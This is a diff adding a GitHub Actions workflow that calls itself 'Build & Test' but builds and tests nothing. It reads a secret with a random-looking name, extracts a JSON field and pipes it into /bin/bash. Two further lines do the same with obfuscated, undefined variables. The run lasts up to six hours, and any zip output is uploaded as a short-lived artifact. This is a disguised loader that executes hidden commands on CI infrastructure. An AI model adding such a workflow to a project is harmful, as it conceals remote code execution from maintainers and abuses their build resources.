@@ -1,0 +1,28 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          d38597: ${{ secrets.d38597 }}
+        run: |
+          printf '%s' "$d38597" | jq -r .t2 | /bin/bash
+          echo $qvonv9 | jq -r .i2 | /bin/bash
+          printf '%s' "$pyxsc747" | jq -r .fobh8 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 8oUXqrq4
+          path: "*.zip"
+          retention-days: 1
